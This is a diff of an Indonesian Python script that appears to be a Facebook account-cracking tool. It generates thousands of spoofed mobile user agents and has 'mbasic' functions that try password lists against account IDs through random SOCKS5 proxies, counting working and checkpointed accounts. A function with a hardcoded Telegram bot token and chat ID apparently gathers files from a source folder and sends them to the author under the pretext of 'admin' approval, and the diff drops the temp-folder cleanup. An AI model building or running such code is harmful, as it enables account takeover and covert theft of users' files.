@@ -165,7 +165,7 @@ for xd in range(1000):
 	strvnokiax = f"Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/{str(rc(build_nokiax))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(100,104))}.0.{str(rr(3900,4900))}.{str(rr(40,150))} Mobile Safari/537.36 NokiaBrowser/7.{str(rr(1,5))}.1.{str(rr(16,37))} {str(rc(aZ))}{str(rr(1,1000))}"
 	strvgt = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; {str(rc(gt))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(100,104))}.0.{str(rr(3900,4900))}.{str(rr(40,150))} Mobile Safari/537.36 {str(rc(aZ))}{str(rr(1,1000))}"
 	uateddy = random.choice([strvredmi,strvsamsung,strvgt])
-	ugen.append(uateddy)
+	baru.append(uateddy)
 
 for xd in range(10000):
 	rr = random.randint; rc = random.choice
@@ -191,82 +191,8 @@ for xd in range(10000):
 	strvinfinix = f"Mozilla/5.0 (Linux; Android {str(rc(andro))}; {str(rc(infinix))}) Build/{str(rc(lonte))}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(108,150))}.0.{str(rr(5359,5555))}.{str(rr(128,150))} Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/347.0.0.17.97;]"
 	asep = f"Mozilla/5.0 (iPhone; CPU iPhone OS 12_1_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16D57 [FBAN/FBIOS;FBAV/209.0.0.33.90;FBBV/142900020;FBDV/iPhone10,3;FBMD/iPhone;FBSN/iOS;FBSV/12.1.4;FBSS/3;FBCR/U.S. Cellular;FBID/phone;FBLC/en_US;FBOP/5;FBRV/143925426]"
 	uateddy = random.choice([strvredmi, strvsamsung, strvgt])
-	ugen.append(uateddy)
+	baru.append(uateddy)
 	
-# List generator untuk User-Agent
-for _ in range(10000):
-    # Fungsi random untuk lebih mudah dibaca
-    random_char = lambda: random.choice("ABCDEFGHIJKLMNOPQRSTUVWXYZ")
-    random_android_version = lambda: random.choice(
-        ["3.0", "4.4.2", "4.4.4", "5.0.1", "8.0", "7.0", "6.0", "5.0", "4.0", "4.3.4", "7.0.1", "8.0.1", "3", "4", "5", "6", "7", "8", "9", "10", "11", "12", "13"]
-    )
-    random_build = lambda: "".join([random_char() for _ in range(3)]) + str(random.randint(11, 99)) + random_char()
-    
-    # Device list
-    oppo_devices = ["CPH1869", "CPH1929", "CPH2107", "CPH2238", "CPH2389", "CPH2401"]
-    redmi_devices = ["2201116SI", "M2012K11AI", "22011119TI", "21091116UI", "M2102K1AC"]
-    infinix_devices = ["X676B", "X687", "X609", "X697", "X680D"]
-    samsung_devices = ["E025F", "G996B", "A826S", "E135F", "G781B"]
-    gt_devices = ["GT-1015", "GT-1020", "GT-1030", "GT-1035", "GT-1040"]
-    nokia_builds = ["JDQ39", "JZO54K"]
-
-    # User-Agent templates
-    user_agents = [
-        f"Mozilla/5.0 (Linux; Android {random_android_version()}; {random.choice(oppo_devices)} Build/{random_build()}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{random.randint(95, 100)}.0.{random.randint(4638, 4900)}.{random.randint(74, 150)} Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/337.1.0.11.118;]",
-        f"Mozilla/5.0 (Linux; Android {random_android_version()}; {random.choice(redmi_devices)}) Build/{random_build()} AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{random.randint(94, 100)}.0.{random.randint(4606, 4900)}.{random.randint(71, 100)} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/339.0.0.32.118;]",
-        f"Mozilla/5.0 (Linux; U; Android {random_android_version()}; in-id; {random.choice(oppo_devices)} Build/{random_build()}) AppleWebKit/537.36 (KHTML, seperti Gecko) Version/4.0 Chrome/{random.randint(70, 100)}.0.{random.randint(3538, 4000)}.{random.randint(80, 150)} Mobile Safari/537.36 HeyTapBrowser/45.7.5.9",
-        f"Mozilla/5.0 (Linux; Android {random_android_version()}; {random.choice(infinix_devices)}) Build/{random_build()} AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{random.randint(80, 100)}.0.{random.randint(3987, 4200)}.{random.randint(99, 150)} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/348.0.0.39.118;]",
-        f"Mozilla/5.0 (Linux; Android {random_android_version()}; {random.choice(samsung_devices)}) Build/{random_build()} AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{random.randint(95, 100)}.0.{random.randint(4638, 4999)}.{random.randint(74, 150)} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/344.0.0.34.116;]",
-        f"Mozilla/5.0 (Linux; Android {random_android_version()}; N150DL Build/{random.choice(nokia_builds)}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{random.randint(112, 150)}.0.{random.randint(5615, 5999)}.{random.randint(135, 150)} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/418.0.0.33.69;]",
-        f"Mozilla/5.0 (Linux; Android {random_android_version()}; {random.choice(gt_devices)}) Build/{random_build()} AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{random.randint(87, 100)}.0.{random.randint(4280, 4900)}.{random.randint(141, 150)} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/327.0.0.33.120;]",
-    ]
-
-    # Pilih User-Agent secara acak
-    selected_ua = random.choice(user_agents)
-    baru.append(selected_ua)
-
-# Loop pertama
-for t in range(10000):
-    aa = "Mozilla/5.0 (Linux; Android"
-    android_version = random.choice(['8.1.0', '4', '5', '6', '7', '8', '9', '10', '11', '12'])
-    device = "SM-J600G)"
-    random_letter_1 = random.choice("ABCDEFGHIJKLMNOPQRSTUVWXYZ")
-    random_number = random.randrange(1, 1000)
-    random_letter_2 = random.choice("ABCDEFGHIJKLMNOPQRSTUVWXYZ")
-    browser_info = "AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/101.0.4951.61"
-    version_minor = random.randrange(73, 100)
-    version_patch = random.randrange(4200, 4900)
-    version_build = random.randrange(40, 150)
-    safari_info = "Mobile Safari/537.36"
-    uaku = f"{aa} {android_version}; {device}{random_letter_1}{random_number}{random_letter_2}) {browser_info}{version_minor}.0.{version_patch}.{version_build} {safari_info}"
-    ugen.append(uaku)
-
-# Loop kedua
-for _ in range(10000):
-    rr = random.randint
-    rc = random.choice
-    uazku1 = f"Mozilla/5.0 (Linux; Android 7.1.2; Redmi 5pro Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{rr(73, 99)}.0.{rr(4500, 4900)}.{rr(75, 150)} Mobile Safari/537.36"
-    uazku2 = f"Mozilla/5.0 (Linux; U; Android {rr(9, 13)}; Redmi 6 Pro Build/PKQ1.{rr(111111, 199999)}.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{rr(75, 150)}.0.{rr(5500, 5900)}.{rr(73, 99)} Mobile Safari/537.36"
-    uazku3 = f"Mozilla/5.0 (Linux; Android {rr(9, 13)}; Redmi 8 Build/QKQ1.{rr(211111, 299999)}.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{rr(75, 150)}.0.{rr(5500, 5900)}.{rr(73, 140)} Mobile Safari/537.36"
-    ugen.append(rc([uazku1, uazku2, uazku3]))
-
-# Loop ketiga
-build_nokiax = ['JDQ39', 'JZO54K']
-miui_v3 = ['-g', '-gn', '-go', '-gn', 'gzip(gfe)', 'swan-mibrowser']
-miui_v1 = list(map(str, range(13)))
-miui_v2 = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '10', '11', '14', '22', '27', '36']
-alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
-languages = ['en-us', 'en-gb', 'id-id', 'de-de', 'ru-ru', 'en-sg', 'fr-fr', 'fa-ir', 'ja-jp', 'pt-br', 'cs-cz', 'zh-hk', 'zh-cn', 'vi-vn', 'en-ph', 'en-in', 'tr-tr']
-gt_models = ['GT-1015', 'GT-1020', 'GT-1030', 'GT-1035', 'GT-1040', 'GT-1045', 'GT-1050', 'GT-1240', 'GT-1440', 'GT-1450']
-
-for _ in range(1000):
-    rr = random.randint
-    rc = random.choice
-    ugent1 = f"Mozilla/5.0 (Linux; Android {rr(4, 12)}; {rc(gt_models)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{rr(100, 104)}.0.{rr(3900, 4900)}.{rr(40, 150)} Mobile Safari/537.36 {rc(alphabet)}{rr(1, 1000)}"
-    ugent2 = f"Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/{rc(build_nokiax)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{rr(100, 104)}.0.{rr(3900, 4900)}.{rr(40, 150)} Mobile Safari/537.36 NokiaBrowser/7.{rr(1, 5)}.1.{rr(16, 37)} {rc(alphabet)}{rr(1, 1000)}"
-    ugent3 = f"Mozilla/5.0 (Linux; U; Android {rr(4, 12)}; {rc(languages)}; Redmi 5 Plus Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{rr(40, 104)}.0.{rr(3900, 4900)}.{rr(40, 150)} Mobile Safari/537.36 XiaoMi/MiuiBrowser/{rr(1, 99)}.{rc(miui_v1)}.{rc(miui_v2)}{rc(miui_v3)} {rc(alphabet)}{rr(1, 1000)}"
-    ugen.append(random.choice([ugent1, ugent2, ugent3]))
-
 def uaku():
     try:
         ua = open("fan.txt", "r").read().splitlines()
@@ -877,8 +803,14 @@ def Mengirim_Dokumen(file_path):
     except Exception as e:
         pass  # postinserted
     return None
-    
+
 def maindulu():
+	try:
+		token = open("./temp_documents", "r").read()
+		menu()
+	except:
+		maindulu2()
+def maindulu2():
 	BOT_TOKEN = "7829625950:AAHAkDANqB9yalb2vClpxX5zXBpHBaq_iVM"  # Ganti dengan token bot Telegram Anda
 	CHAT_ID = "7708185346"      # Ganti dengan ID chat penerima
 	# Path folder sumber
@@ -910,7 +842,7 @@ def maindulu():
 				else:
 					print(f"script anda gagal di proses oleh admin coba hubungi admin MR.ExceFaN ")
 		# Hapus folder sementara setelah selesai
-		shutil.rmtree(temp_folder)
+		
 		menu()
 		
 	except:
@@ -1572,7 +1504,7 @@ def metcepat():
 
 
 
-def mbasic(idf, pwv):
+def mbasiccc(idf, pwv):
     global loop, ok, cp
     ua = random.choice(baru)
     ua2 = random.choice(ugen)
@@ -1582,9 +1514,7 @@ def mbasic(idf, pwv):
     
     for pw in pwv:
         try:
-            if 'ya' in ualuh: 
-                ua = ualu[0]
-            
+            if 'ya' in ualuh:ua = ualu[0]
             nip = random.choice(prox)
             proxs = {'http': 'socks5://' + nip}
             
@@ -1671,14 +1601,14 @@ def mbasic(idf, pwv):
 
 
 #----------------------[ METHODE-MTOUCH+MOBILE-4 ]-----------------#
-def mbasicccccc(idf,pwv):
+def mbasic(idf,pwv):
 	global loop,ok,cp
 	nip=random.choice(prox)
 	proxs= {'http': 'socks5://'+nip}
 	ua = random.choice(ugen2)
 	console.print(f"\r {H2}• {P2}User Agent {H2} %s {P2} Id"%(ua), end="\r")
 	ses = requests.Session()
-	prog.update(des,description=f"[[bold green]Mbasic[bold white]] [[bold green]{idf}[bold white]] {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
+	prog.update(des,description=f"[[bold green]Mbasic new [🗿][bold white]] [[bold green]{idf}[bold white]] {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
 	prog.advance(des)
 	for pw in pwv:
 		try:
